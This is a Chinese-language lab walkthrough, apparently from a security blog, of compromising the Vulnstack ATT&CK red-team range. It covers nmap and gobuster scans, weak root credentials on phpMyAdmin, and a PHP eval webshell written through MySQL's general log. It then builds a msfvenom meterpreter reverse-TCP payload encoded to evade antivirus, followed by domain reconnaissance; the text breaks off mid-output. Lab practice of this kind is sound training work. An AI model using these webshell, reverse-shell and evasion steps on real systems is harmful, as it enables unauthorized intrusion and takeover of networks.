{"pageProps":{"postData":{"id":"Vulnstack红队评估实战靶场(一)","contentHtml":"<h1>ATT&#x26;CK红队评估实战靶场(一)</h1>\n<blockquote>\n<p><a href=\"http://vulnstack.qiyuanxuetang.net/vuln/detail/2/\">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>\n</blockquote>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image.png\" alt=\"拓扑\"></p>\n<h2>靶场搭建</h2>\n<ul>\n<li>\n<p>靶机通用密码：<code>hongrisec@2019</code></p>\n</li>\n<li>\n<p><code>ip</code>网络设置</p>\n<p>创建一个仅主机的虚拟网卡，网段是<code>192.168.52.0</code> ，<code>nat</code>网卡随意<code>ip</code>，用来模拟<code>web</code>服务器外网，我这里是<code>192.168.75.0</code>网段</p>\n<p>内网主机<code>windows 2003</code>以及<code>windows 2008</code>使用仅主机的虚拟网卡</p>\n<p>边缘主机<code>windows 7</code>使用仅主机的虚拟网卡以及<code>nat</code>网卡</p>\n<p>渗透主机<code>kali</code>也使用<code>nat</code>网卡（<code>192.168.75.151</code>）</p>\n</li>\n<li>\n<p>测试网络</p>\n<p>边缘主机可以<code>ping</code>通外网以及域成员，其他两个域成员不能通外网</p>\n</li>\n<li>\n<p>在边缘主机<code>win7</code> 的<code>c</code>盘打开<code>phpstudy</code> ，然后将服务启动（假如<code>phpmystudy</code>打开报错，就把虚拟机兼容性改为<code>17.x</code>）</p>\n</li>\n<li>\n<p>靶场环境搭建完成，开始渗透</p>\n</li>\n</ul>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>使用<code>nmap</code>扫描网段类存活主机</p>\n<p>因为靶机是我最后添加的，所以靶机IP是<code>186</code></p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>                    \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-12 22:26 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00019</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00016</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.186</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00024</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">55</span>:CF:<span class=\"hljs-number\">64</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00024</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:E8:BD:<span class=\"hljs-title function_ invoke__\">A6</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\n</code></pre>\n</li>\n<li>\n<p>扫描主机开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.186</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-12 22:26 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.186</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00061</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> filtered tcp <span class=\"hljs-title function_ invoke__\">ports</span> (no-response)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">80</span>/tcp   open  http\n<span class=\"hljs-number\">135</span>/tcp  open  msrpc\n<span class=\"hljs-number\">3306</span>/tcp open  mysql\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">55</span>:CF:<span class=\"hljs-number\">64</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>扫描主机服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">3306</span>,<span class=\"hljs-number\">135</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.186</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-12 22:27 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.186</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00042</span>s latency).\n\nPORT     STATE SERVICE VERSION\n<span class=\"hljs-number\">80</span>/tcp   open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">23</span> ((Win32) OpenSSL/<span class=\"hljs-number\">1.0</span>.<span class=\"hljs-number\">2</span>j PHP/<span class=\"hljs-number\">5.4</span>.<span class=\"hljs-number\">45</span>)\n<span class=\"hljs-number\">135</span>/tcp  open  msrpc   Microsoft Windows RPC\n<span class=\"hljs-number\">3306</span>/tcp open  mysql   <span class=\"hljs-title function_ invoke__\">MySQL</span> (unauthorized)\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">55</span>:CF:<span class=\"hljs-number\">64</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nAggressive OS guesses: Microsoft Windows Phone <span class=\"hljs-number\">7.5</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-number\">8.0</span> (<span class=\"hljs-number\">96</span>%), Microsoft Windows Embedded Standard <span class=\"hljs-number\">7</span> (<span class=\"hljs-number\">96</span>%), Microsoft Windows <span class=\"hljs-number\">8.1</span> <span class=\"hljs-title function_ invoke__\">R1</span> (<span class=\"hljs-number\">94</span>%), Microsoft Windows Server <span class=\"hljs-number\">2008</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-number\">2008</span> Beta <span class=\"hljs-number\">3</span> (<span class=\"hljs-number\">92</span>%), Microsoft Windows Server <span class=\"hljs-number\">2008</span> R2 <span class=\"hljs-keyword\">or</span> Windows <span class=\"hljs-number\">8.1</span> (<span class=\"hljs-number\">92</span>%), Microsoft Windows <span class=\"hljs-number\">7</span> Professional <span class=\"hljs-keyword\">or</span> Windows <span class=\"hljs-number\">8</span> (<span class=\"hljs-number\">92</span>%), Microsoft Windows Vista SP0 <span class=\"hljs-keyword\">or</span> SP1, Windows Server <span class=\"hljs-number\">2008</span> SP1, <span class=\"hljs-keyword\">or</span> Windows <span class=\"hljs-number\">7</span> (<span class=\"hljs-number\">92</span>%), Microsoft Windows Vista SP2, Windows <span class=\"hljs-number\">7</span> SP1, <span class=\"hljs-keyword\">or</span> Windows Server <span class=\"hljs-number\">2008</span> (<span class=\"hljs-number\">92</span>%), Microsoft Windows Server <span class=\"hljs-number\">2008</span> R2 <span class=\"hljs-title function_ invoke__\">SP1</span> (<span class=\"hljs-number\">90</span>%), Microsoft Windows Server <span class=\"hljs-number\">2008</span> <span class=\"hljs-title function_ invoke__\">SP1</span> (<span class=\"hljs-number\">89</span>%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> <span class=\"hljs-title function_ invoke__\">host</span> (test conditions non-ideal).\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:window\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">135</span>,<span class=\"hljs-number\">3306</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>                                                                                                                                                               \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">12</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">28</span> CST                                                                                                                                                \nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>                                                                                                                                                                               \nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00066</span>s latency).                                                                                                                                                                                    \n                                                                                                                                                                                                                  \nPORT     STATE SERVICE                                                                                                                                                                                            \n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http                                                                                                                                                                                               \n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.                                                                                                                                                             \n| http-sql-injection:                                                                                                                                                                                             \n|   Possible sqli for queries:                                                                                                                                                                                    \n|     http://192.168.75.186:80/l.php?act=phpinfo%27%20OR%20sqlspider                                                                                                                                              \n|     http://192.168.75.186:80/l.php?act=Function%27%20OR%20sqlspider                                                                                                                                             \n|     http://192.168.75.186:80/l.php?act=phpinfo%27%20OR%20sqlspider                                                                                                                                              \n|     http://192.168.75.186:80/l.php?act=Function%27%20OR%20sqlspider                                                                                                                                             \n|     http://192.168.75.186:80/l.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000%27%20OR%20sqlspider                                                                                                                 \n|     http://192.168.75.186:80/l.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42%27%20OR%20sqlspider                                                                                                                 \n|     http://192.168.75.186:80/l.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42%27%20OR%20sqlspider                                                                                                                 \n|   Possible sqli for forms:                                                                                                                                                                                      \n|     Form at path: /, form'</span>s action: /l.php<span class=\"hljs-comment\">#bottom. Fields that might be vulnerable:                                                                                                                             </span>\n|       host                                                                                                                                                                                                      \n|       port                                                                                                                                                                                                      \n|       login                                                                                                                                                                                                     \n|       funName                                                                                                                                                                                                   \n|     Form at path: /l.php, form<span class=\"hljs-string\">'s action: /l.php#bottom. Fields that might be vulnerable:                                                                                                                        \n|       host                                                                                                                                                                                                      \n|       port                                                                                                                                                                                                      \n|       login                                                                                                                                                                                                     \n|_      funName                                                                                                                                                                                                   \n| http-slowloris-check:                                                                                                                                                                                                   \n|_http-trace: TRACE is enabled                                     \n|_http-stored-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> stored XSS vulnerabilities.                                         \n| http-phpself-xss:                                 \n|   VULNERABLE:                                     \n|   Unsafe use of $_SERVER[<span class=\"hljs-string\">\"PHP_SELF\"</span>] <span class=\"hljs-keyword\">in</span> PHP files                                                      \n|     State: VULNERABLE (Exploitable)               \n|       PHP files are <span class=\"hljs-keyword\">not</span> handling safely the variable $_SERVER[<span class=\"hljs-string\">\"PHP_SELF\"</span>] causing Reflected Cross Site Scripting vulnerabilities.\n|                                                   \n|     Extra information:                            \n|                                                   \n|   Vulnerable files <span class=\"hljs-keyword\">with</span> proof of concept:         \n|     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>/l.php/%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">22</span>/%3E%3Cscript%3Ealert(<span class=\"hljs-number\">1</span>)%3C/script%3E                            \n|   Spidering limited to: maxdepth=<span class=\"hljs-number\">3</span>; maxpagecount=<span class=\"hljs-number\">20</span>; withinhost=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>                         \n|     References:                \n|   Spidering limited to: maxdepth=<span class=\"hljs-number\">3</span>; maxpagecount=<span class=\"hljs-number\">20</span>; withinhost=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>                         \n|     References:                                   \n|       https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)                                       \n|_      http://php.net/manual/en/reserved.variables.server.php                                           \n| http-enum:                                        \n|   /phpinfo.php: Possible information file         \n|   /phpmyadmin/: phpMyAdmin                        \n|   /phpMyAdmin/: phpMyAdmin                        \n|_  /PHPMyAdmin/: phpMyAdmin                        \n<span class=\"hljs-number\">135</span>/tcp  <span class=\"hljs-built_in\">open</span>  msrpc                                \n<span class=\"hljs-number\">3306</span>/tcp <span class=\"hljs-built_in\">open</span>  mysql                                \nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">55</span>:CF:<span class=\"hljs-number\">64</span> (VMware)\n</code></pre>\n<p>扫描发现<code>135</code>端口，因为也是<code>window</code>主机，所以可能有用</p>\n<p>不过还是从<code>web</code>渗透开始，发现可能是<code>sql</code>注入的地方，也发现了<code>phpmyadmin</code></p>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>访问主页</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image1.png\" alt=\"image.png\"></p>\n<p>发现是<code>phpStudy探针</code> 能暴露出很多东西</p>\n<ul>\n<li>主机版本 <code>Windows 7 Business Edition Service Pack 1</code></li>\n<li>服务版本 <code>Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</code></li>\n<li>网站的绝对路径 <code>C:/phpStudy/WWW</code></li>\n<li><code>PHP</code> 已经安装的模块</li>\n</ul>\n</li>\n<li>\n<p>拉取到最下面有个<code>MySQL数据库连接检测</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image2.png\" alt=\"image.png\"></p>\n<p>我们尝试弱口令账户密码都使用<code>root</code> ，测试链接成功….</p>\n</li>\n<li>\n<p>不管怎么说，我们先对网站进行目录扫描</p>\n<pre><code class=\"hljs language-python\">gobuster <span class=\"hljs-built_in\">dir</span> -u http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span> -w /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt -x php,html,<span class=\"hljs-built_in\">zip</span>,txt | grep -v <span class=\"hljs-string\">\"403\"</span>\n===============================================================\nGobuster v3<span class=\"hljs-number\">.6</span>\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>\n[+] Method:                  GET\n[+] Threads:                 <span class=\"hljs-number\">10</span>\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt\n[+] Negative Status codes:   <span class=\"hljs-number\">404</span>\n[+] User Agent:              gobuster/<span class=\"hljs-number\">3.6</span>\n[+] Extensions:              php,html,<span class=\"hljs-built_in\">zip</span>,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/l.php                (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">14735</span>]\n/L.php                (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">14735</span>]\n/phpmyadmin           (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">241</span>] [--> http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>/phpmyadmin/]\n/phpinfo.php          (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">71329</span>]\n/phpMyAdmin           (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">241</span>] [--> http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>/phpMyAdmin/]\nProgress: <span class=\"hljs-number\">1102800</span> / <span class=\"hljs-number\">1102805</span> (<span class=\"hljs-number\">100.00</span>%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>没找到什么</p>\n</li>\n<li>\n<p>前面知道数据库账号密码都是<code>root</code>，所以直接登录<code>phpmyadmin</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image3.png\" alt=\"image.png\"></p>\n<p>登陆成功</p>\n</li>\n<li>\n<p>尝试利用<code>phpmyadmin</code>后台<code>getshell</code></p>\n<ul>\n<li>\n<p>尝试使用<code>outfile</code>等方法，因为我们知道了网站的绝对路径</p>\n<p>首先查看<code>secure_file_priv</code>权限</p>\n<pre><code class=\"hljs language-python\">SHOW GLOBAL VARIABLES LIKE <span class=\"hljs-string\">'%secure%'</span>\n//\nsecure_file_priv \tNULL\n</code></pre>\n<p><code>NULL</code>就无法利用了</p>\n</li>\n<li>\n<p>使用日志文件写入<code>shell</code></p>\n<ol>\n<li>\n<p>首先查看全局日志文件是否开启</p>\n<pre><code class=\"hljs language-python\">SHOW VARIABLES LIKE <span class=\"hljs-string\">'%general%'</span>\n//\ngeneral_log \tOFF\ngeneral_log_file \tC:\\phpStudy\\MySQL\\data\\stu1.log\n</code></pre>\n</li>\n<li>\n<p>我们两个参数都要进行设置，将<code>general_log</code> 设置为<code>ON</code> ，将<code>general_log_file</code> 设置在网站目录里面的文件</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-built_in\">set</span> <span class=\"hljs-keyword\">global</span> general_log = <span class=\"hljs-string\">\"ON\"</span>;\n<span class=\"hljs-built_in\">set</span> <span class=\"hljs-keyword\">global</span> general_log_file=<span class=\"hljs-string\">'C:/phpStudy/WWW/test.php'</span>;\n</code></pre>\n</li>\n<li>\n<p>设置完后再检查参数是否设置成功</p>\n<pre><code class=\"hljs language-python\">general_log \tON\ngeneral_log_file \tC:/phpStudy/WWW/test.php\n</code></pre>\n</li>\n<li>\n<p>设置成功，然后我们在执行栏输入恶意语句</p>\n<pre><code class=\"hljs language-python\">select <span class=\"hljs-string\">\"&#x3C;?php eval($_POST[1]); ?>\"</span>;\n</code></pre>\n</li>\n<li>\n<p>执行完后，会被写入到日志文件里（<code>C:/phpStudy/WWW/test.php</code>），就是已经将一句话木马写入了<code>test.php</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image4.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n</li>\n</ul>\n</li>\n<li>\n<p>使用蚁🗡连接</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image5.png\" alt=\"image.png\"></p>\n<p>连接成功，相当于<code>getshell</code>了已经</p>\n</li>\n<li>\n<p>在蚁🗡查看当前目录</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image6.png\" alt=\"image.png\"></p>\n<ul>\n<li>\n<p>存在<code>beifen.rar</code> ，我们将它拉取下来查看</p>\n<p>解压出来是<code>yxcms</code>的源码，表示存在<code>yxcms</code></p>\n</li>\n<li>\n<p>还存在<code>yxcms</code> 目录，就是使用上面压缩包的源码搭建的</p>\n</li>\n</ul>\n</li>\n<li>\n<p>浏览器访问<code>yxcms</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image7.png\" alt=\"image.png\"></p>\n<p>果然是搭建了，但是我们已经能连接了，就没必要干这里了</p>\n</li>\n</ol>\n<h2>获得shell</h2>\n<ol>\n<li>\n<p>上面蚁🗡已经连接了，到这步就是要获得<code>shell</code>了</p>\n</li>\n<li>\n<p><code>kali</code>制作反弹<code>shell</code>马，指定<code>-e x86/shikata_ga_nai</code> 是因为靶机上可能存在杀软</p>\n<pre><code class=\"hljs language-python\">msfvenom -p windows/meterpreter_reverse_tcp LHOST=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span> LPORT=<span class=\"hljs-number\">1234</span> -e x86/shikata_ga_nai -f exe -o shell.exe\n</code></pre>\n</li>\n<li>\n<p>通过蚁🗡上传马到靶机上</p>\n</li>\n<li>\n<p><code>kali</code>开启监听</p>\n<pre><code class=\"hljs language-python\">msf6 exploit(multi/handler) > use exploit/multi/handler\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> payload windows/x64/meterpreter_reverse_tcp\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lport <span class=\"hljs-number\">1234</span>\nmsf6 exploit(multi/handler) > run\n</code></pre>\n</li>\n<li>\n<p>通过蚁🗡启动马</p>\n<pre><code class=\"hljs language-python\">C:\\phpStudy\\WWW> shell.exe\n</code></pre>\n<pre><code class=\"hljs language-python\">[*] Started reverse TCP handler on <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>:<span class=\"hljs-number\">1234</span> \n[*] Meterpreter session <span class=\"hljs-number\">5</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>:<span class=\"hljs-number\">1234</span> -> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>:<span class=\"hljs-number\">2114</span>) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">13</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">32</span> +0800\n\nmeterpreter > \n</code></pre>\n<p>获得<code>shell</code> ，上线<code>MSF</code></p>\n</li>\n</ol>\n<h2>内网信息收集</h2>\n<ol>\n<li>\n<p>查看当前靶机IP</p>\n<pre><code class=\"hljs language-python\">meterpreter > ipconfig                                                                                                                                                                                                                                                                                                                                                                                                          \nInterface <span class=\"hljs-number\">11</span>                                                                                                                                                                                                      \n============                                                                                                                                                                                                      \nName         : Intel(R) PRO/<span class=\"hljs-number\">1000</span> MT Network Connection                                                                                                                                                            \nHardware MAC : <span class=\"hljs-number\">00</span>:0c:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">55</span>:cf:5a                                                                                                                                                                                  \nMTU          : <span class=\"hljs-number\">1500</span>                                                                                                                                                                                               \nIPv4 Address : <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.143</span>                                                                                                                                                                                     \nIPv4 Netmask : <span class=\"hljs-number\">255.255</span><span class=\"hljs-number\">.255</span><span class=\"hljs-number\">.0</span>                                                                                                                                                                                      \nIPv6 Address : fe80::69c6:31ff:4e4e:e80b            \nIPv6 Netmask : ffff:ffff:ffff:ffff:: \nInterface <span class=\"hljs-number\">26</span>\n============\nName         : Intel(R) PRO/<span class=\"hljs-number\">1000</span> MT Network Connection <span class=\"hljs-comment\">#3</span>\nHardware MAC : <span class=\"hljs-number\">00</span>:0c:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">55</span>:cf:<span class=\"hljs-number\">64</span>\nMTU          : <span class=\"hljs-number\">1500</span>\nIPv4 Address : <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>\nIPv4 Netmask : <span class=\"hljs-number\">255.255</span><span class=\"hljs-number\">.255</span><span class=\"hljs-number\">.0</span>\nIPv6 Address : fe80::407d:48b5:70cc:cce6\nIPv6 Netmask : ffff:ffff:ffff:ffff::\n</code></pre>\n<p>可以查看到存在两张网卡，内网地址是<code>192.168.52.143</code></p>\n</li>\n<li>\n<p>当前主机系统信息等</p>\n<pre><code class=\"hljs language-python\">meterpreter > sysinfo\nComputer        : STU1\nOS              : Windows <span class=\"hljs-number\">7</span> (<span class=\"hljs-number\">6.1</span> Build <span class=\"hljs-number\">7601</span>, Service Pack <span class=\"hljs-number\">1</span>).\nArchitecture    : x64\nSystem Language : zh_CN\nDomain          : GOD\nLogged On Users : <span class=\"hljs-number\">2</span>\nMeterpreter     : x86/windows\n</code></pre>\n<p>存在域<code>GOD</code></p>\n</li>\n<li>\n<p>发现主DNS后缀不为空，存在域<code>god.org</code></p>\n<pre><code class=\"hljs language-python\">C:\\phpStudy\\WWW>net config workstation\nnet config workstation\nComputer name                        \\\\STU1\nFull Computer name                   stu1.god.org\nUser name                            Administrator\n\nWorkstation active on                \n        NetBT_Tcpip_{4DAEBDFD-0177-<span class=\"hljs-number\">4691</span>-<span class=\"hljs-number\">8243</span>-B73297E2F0FF} (000C2955CF5A)\n        NetBT_Tcpip_{43B076D2-BB12-<span class=\"hljs-number\">42E8</span>-AF64-3CFB49A31501} (000C2955CF64)\n        NetBT_Tcpip_{EC57C4EB-<span class=\"hljs-number\">763E-4000</span>-9CDE-4D7FF15DF74C} (02004C4F4F50)\n\nSoftware version                     Windows <span class=\"hljs-number\">7</span> Professional\n\nWorkstation domain                   GOD\nWorkstation Domain DNS Name          god.org\nLogon domain                         GOD\n\nCOM Open Timeout (sec)               <span class=\"hljs-number\">0</span>\nCOM Send Count (byte)                <span class=\"hljs-number\">16</span>\nCOM Send Timeout (msec)              <span class=\"hljs-number\">250</span>\nThe command completed successfully.\n</code></pre>\n</li>\n<li>\n<p>寻找是否存在别的域</p>\n<pre><code class=\"hljs language-python\">C:\\phpStudy\\WWW>net view /domain\nnet view /domain\nDomain\n\n-------------------------------------------------------------------------------\nGOD                  \nThe command completed successfully.\n</code></pre>\n<p>仅存在一个域</p>\n</li>\n<li>\n<p>只有一个域我们就查看域控制器的主机名，方便我们去确定那台是域控<code>DC</code></p>\n<pre><code class=\"hljs language-python\">C:\\phpStudy\\WWW>net group <span class=\"hljs-string\">\"domain controllers\"</span> /domain\nThe request will be processed at a domain controller <span class=\"hljs-keyword\">for</span> domain god.org.\n\nGroup name     Domain Controllers\nComment        \n\nMembers\n\n-------------------------------------------------------------------------------\nOWA$                     \nThe command completed successfully.\n</code></pre>\n<p>确定域控制器主机名为<code>OWA</code></p>\n</li>\n<li>\n<p>查看域内主机其他主机信息</p>\n<pre><code class=\"hljs language-python\">C:\\phpStudy\\WWW>net view\nnet view\nServer Name            Remark\n\n-------------------------------------------------------------------------------\n\\\\OWA                                                                          \n\\\\ROOT-TVI862UBEH                                                              \nThe command completed successfully.\n</code></pre>\n<p>域控 <code>OWA</code>，域成员<code>ROOT-TVI862UBEH</code></p>\n<p>然后通过<code>ping</code>命令获取<code>IP</code></p>\n<pre><code class=\"hljs language-python\">C:\\phpStudy\\WWW>ping owa\nPinging owa.god.org [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.138</span>] <span class=\"hljs-keyword\">with</span> <span class=\"hljs-number\">32</span> <span class=\"hljs-built_in\">bytes</span> of data:\nC:\\phpStudy\\WWW>ping ROOT-TVI862UBEH\nPinging ROOT-TVI862UBEH.god.org [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.141</span>] <span class=\"hljs-keyword\">with</span> <span class=\"hljs-number\">32</span> <span class=\"hljs-built_in\">bytes</span> of data:\n</code></pre>\n<p>域控<code>OWA 192.168.52.138</code>；域成员<code>ROOT-TVI862UBEH 192.168.52.141</code> 接下来的目的就是横向拿下域控</p>\n</li>\n<li>\n<p>查看域内用户，有五个用户</p>\n<pre><code class=\"hljs language-python\">C:\\phpStudy\\WWW>net user /domain\nnet user /domain\nThe request will be processed at a domain controller <span class=\"hljs-keyword\">for</span> domain god.org.\n\nUser accounts <span class=\"hljs-keyword\">for</span> \\\\owa.god.org\n\n-------------------------------------------------------------------------------\nAdministrator            Guest 